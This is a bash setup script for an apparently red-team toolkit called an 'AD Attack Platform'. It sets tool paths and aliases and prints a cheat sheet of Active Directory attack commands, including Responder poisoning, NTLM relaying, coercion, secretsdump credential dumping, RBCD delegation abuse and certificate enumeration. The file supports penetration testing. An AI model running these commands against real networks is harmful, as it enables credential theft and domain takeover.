#!/bin/bash
# Helper script that sources this on login to make tools available
# Source this in your shell: source /opt/scripts/tools.sh

export PATH="$PATH:/opt/tools/Responder:/opt/tools/RelayKing-Depth:/opt/tools/gopacket:/opt/tools/AdStrike:/opt/tools/EntraFalcon:/opt/tools/entra-ca-insight:/opt/tools/pySIDHistory:/opt/tools/getSPNless:/opt/tools/ad-reaper:/root/.local/bin"

alias responder='python3 /opt/tools/Responder/Responder.py'
alias relayking='python3 /opt/tools/RelayKing-Depth/relayking.py'
alias bloodhound-python='python3 -m bloodhound'
alias ca-insight='python3 /opt/tools/entra-ca-insight/main.py'
alias pysidhistory='python3 /opt/tools/pySIDHistory/main.py'
alias getspnless='python3 /opt/tools/getSPNless/getSPNless.py'
alias adreaper='python3 /opt/tools/ad-reaper/ad-reaper.py'
alias adstrike='bash /opt/tools/AdStrike/run.sh'
alias entrafalcon='pwsh /opt/tools/EntraFalcon/EntraFalcon.ps1'

help() {
  cat <<'EOF'
  +----------------------------------------------------+
  |         ForestGump.sh - AD Attack Platform         |
  +----------------------------------------------------+

  [ RECONNAISSANCE ]
    bloodhound-python -c LDAP -u USER -p PASS -d DOMAIN -ns TARGET
    adreaper -u USER -p PASS -d DOMAIN -dc-ip TARGET
    nxc ldap TARGET -u USER -p PASS --users
    ldapdomaindump LDAP://TARGET -u DOMAIN\\USER -p PASS

  [ AUTHENTICATION ATTACKS ]
    Responder -I eth0 -w
    coercer list TARGET -u USER -p PASS -d DOMAIN
    impacket-getTGT DOMAIN/USER:PASS@TARGET

  [ PRIVILEGE ESCALATION ]
    bloodyAD --host TARGET -d DOMAIN -u USER -p PASS
    impacket-secretsdump DOMAIN/USER:PASS@TARGET
    certipy-ad find -u USER@DOMAIN -p PASS -dc-ip TARGET
    impacket-rbcd -action write -delegate-from A -delegate-to B DOMAIN/U:P
    pysidhistory TARGET DOMAIN USER:PASS

  [ RELAY & PROXY ]
    relayking
    impacket-ntlmrelayx -tf targets.txt -smb2support

  [ CLOUD (AZURE/ENTRA ID) ]
    roadrecon auth -u USER@DOMAIN -p PASS
    ca-insight
    entrafalcon

  [ UTILITY ]
    gopacket-*    tab-complete for all 63 Go tools
    impacket-*    full Python impacket suite
    nxc           NetExec
    getspnless SPN TARGET

  [ QUICK START ]
    nxc ldap TARGET -u USER -p PASS --users
    bloodhound-python -c LDAP -u USER -p PASS -d DOMAIN -ns TARGET
    impacket-secretsdump DOMAIN/USER:PASS@TARGET
    certipy-ad find -u USER@DOMAIN -p PASS -dc-ip TARGET

  Run any tool with --help / -h for its specific flags.
EOF
}
